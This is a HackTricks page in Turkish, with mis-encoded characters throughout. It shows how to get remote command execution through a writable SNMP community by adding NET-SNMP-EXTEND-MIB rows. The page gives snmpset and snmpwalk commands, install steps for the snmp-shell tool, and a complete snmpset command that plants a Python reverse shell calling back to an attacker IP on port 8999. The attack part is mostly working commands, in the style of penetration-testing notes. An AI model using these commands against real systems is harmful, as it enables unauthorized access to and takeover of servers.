<details>

<summary><strong>AWS hackleme becerilerini sÄ±fÄ±rdan ileri seviyeye Ã¶ÄŸrenmek iÃ§in</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS KÄ±rmÄ±zÄ± TakÄ±m UzmanÄ±)</strong></a><strong>'Ä± Ã¶ÄŸrenin!</strong></summary>

HackTricks'Ä± desteklemenin diÄŸer yollarÄ±:

* **Åirketinizi HackTricks'te reklamÄ±nÄ±zÄ± gÃ¶rmek** veya **HackTricks'i PDF olarak indirmek** iÃ§in [**ABONELÄ°K PLANLARINI**](https://github.com/sponsors/carlospolop) kontrol edin!
* [**Resmi PEASS & HackTricks Ã¼rÃ¼nlerini**](https://peass.creator-spring.com) edinin
* [**PEASS Ailesi'ni**](https://opensea.io/collection/the-peass-family) keÅŸfedin, Ã¶zel [**NFT'lerimizden**](https://opensea.io/collection/the-peass-family) oluÅŸan koleksiyonumuz
* ğŸ’¬ [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) **katÄ±lÄ±n** veya **Twitter** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks_live)'u **takip edin**.
* **Hacking hilelerinizi** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarÄ±na **PR gÃ¶ndererek paylaÅŸÄ±n**.

</details>

# SNMP Uzaktan Komut YÃ¼rÃ¼tme (RCE)

SNMP, yÃ¶neticinin cihaz veya sunucudaki varsayÄ±lan yapÄ±landÄ±rmasÄ±nÄ± gÃ¶z ardÄ± ederse saldÄ±rgan tarafÄ±ndan istismar edilebilir. Bir Linux iÅŸletim sisteminde **SNMP topluluÄŸunu (rwcommunity) kÃ¶tÃ¼ye kullanarak** saldÄ±rgan sunucuda komutlarÄ± yÃ¼rÃ¼tebilir.

## Ek Komutlarla Hizmetleri GeniÅŸletme

SNMP hizmetlerini geniÅŸletmek ve ekstra komutlar eklemek iÃ§in, "nsExtendObjects" tablosuna yeni **satÄ±rlar eklemek mÃ¼mkÃ¼ndÃ¼r**. Bunun iÃ§in `snmpset` komutunu kullanarak gerekli parametreleri saÄŸlamak gerekmektedir. Bu parametreler arasÄ±nda yÃ¼rÃ¼tÃ¼lecek dosyanÄ±n mutlak yolunu ve yÃ¼rÃ¼tÃ¼lecek komutu belirtmek bulunur:
```bash
snmpset -m +NET-SNMP-EXTEND-MIB -v 2c -c c0nfig localhost \
'nsExtendStatus."evilcommand"' = createAndGo \
'nsExtendCommand."evilcommand"' = /bin/echo \
'nsExtendArgs."evilcommand"' = 'hello world'
```
## Komut Enjeksiyonu iÃ§in Komutlar Eklemek

SNMP hizmetinde Ã§alÄ±ÅŸtÄ±rÄ±lmak Ã¼zere komut enjekte etmek, Ã§aÄŸrÄ±lan ikili/dosyanÄ±n varlÄ±ÄŸÄ±nÄ± ve Ã§alÄ±ÅŸtÄ±rÄ±labilir olmasÄ±nÄ± gerektirir. **`NET-SNMP-EXTEND-MIB`** Ã§aÄŸrÄ±lan ikili/dosyanÄ±n mutlak yolunu saÄŸlamayÄ± zorunlu kÄ±lar.

Enjekte edilen komutun Ã§alÄ±ÅŸtÄ±rÄ±ldÄ±ÄŸÄ±nÄ± doÄŸrulamak iÃ§in `snmpwalk` komutu kullanÄ±labilir. **Ã‡Ä±ktÄ±, komutu ve iliÅŸkili ayrÄ±ntÄ±larÄ±** (mutlak yol dahil) iÃ§erecektir:
```bash
snmpwalk -v2c -c SuP3RPrivCom90 10.129.2.26 NET-SNMP-EXTEND-MIB::nsExtendObjects
```
## Enjekte Edilen KomutlarÄ± Ã‡alÄ±ÅŸtÄ±rma

**Enjekte edilen komut okunduÄŸunda Ã§alÄ±ÅŸtÄ±rÄ±lÄ±r**. Bu davranÄ±ÅŸ **`run-on-read()`** olarak bilinir. Komutun Ã§alÄ±ÅŸtÄ±rÄ±lmasÄ±, snmpwalk okunurken gÃ¶zlemlenebilir.

### SNMP ile Sunucu KabuÄŸu Elde Etme

Sunucu Ã¼zerinde kontrol saÄŸlamak ve bir sunucu kabuÄŸu elde etmek iÃ§in, mxrch tarafÄ±ndan geliÅŸtirilen bir Python betiÄŸi kullanÄ±labilir. [**https://github.com/mxrch/snmp-shell.git**](https://github.com/mxrch/snmp-shell.git) adresinden bu betikten yararlanabilirsiniz.

Alternatif olarak, SNMP'ye belirli bir komut enjekte ederek ters kabuk oluÅŸturulabilir. Bu komut, snmpwalk tarafÄ±ndan tetiklenir ve saldÄ±rganÄ±n makinesine ters kabuk baÄŸlantÄ±sÄ± kurarak kurban makine Ã¼zerinde kontrol saÄŸlar.
Bu iÅŸlemi Ã§alÄ±ÅŸtÄ±rmak iÃ§in Ã¶nceden gereksinimleri yÃ¼kleyebilirsiniz:
```bash
sudo apt install snmp snmp-mibs-downloader rlwrap -y
git clone https://github.com/mxrch/snmp-shell
cd snmp-shell
sudo python3 -m pip install -r requirements.txt
```
Ya da ters kabuk:
```bash
snmpset -m +NET-SNMP-EXTEND-MIB -v 2c -c SuP3RPrivCom90 10.129.2.26 'nsExtendStatus."command10"' = createAndGo 'nsExtendCommand."command10"' = /usr/bin/python3.6 'nsExtendArgs."command10"' = '-c "import sys,socket,os,pty;s=socket.socket();s.connect((\"10.10.14.84\",8999));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(\"/bin/sh\")"'
```
## Referanslar
* [https://rioasmara.com/2021/02/05/snmp-arbitary-command-execution-and-shell/](https://rioasmara.com/2021/02/05/snmp-arbitary-command-execution-and-shell/)


<details>

<summary><strong>AWS hackleme konusunda sÄ±fÄ±rdan kahramana dÃ¶nÃ¼ÅŸmek iÃ§in</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS KÄ±rmÄ±zÄ± TakÄ±m UzmanÄ±)</strong></a><strong>'Ä± Ã¶ÄŸrenin!</strong></summary>

HackTricks'i desteklemenin diÄŸer yollarÄ±:

* **Åirketinizi HackTricks'te reklamÄ±nÄ±zÄ± gÃ¶rmek veya HackTricks'i PDF olarak indirmek** iÃ§in [**ABONELÄ°K PLANLARI'na**](https://github.com/sponsors/carlospolop) gÃ¶z atÄ±n!
* [**Resmi PEASS & HackTricks Ã¼rÃ¼nlerini**](https://peass.creator-spring.com) edinin
* Ã–zel [**NFT'lerden**](https://opensea.io/collection/the-peass-family) oluÅŸan koleksiyonumuz olan [**The PEASS Family**](https://opensea.io/collection/the-peass-family)'yi keÅŸfedin
* ğŸ’¬ [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) **katÄ±lÄ±n** veya **Twitter** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks_live)'u **takip edin**.
* **Hacking hilelerinizi HackTricks ve HackTricks Cloud** github depolarÄ±na **PR gÃ¶ndererek paylaÅŸÄ±n**.

</details>
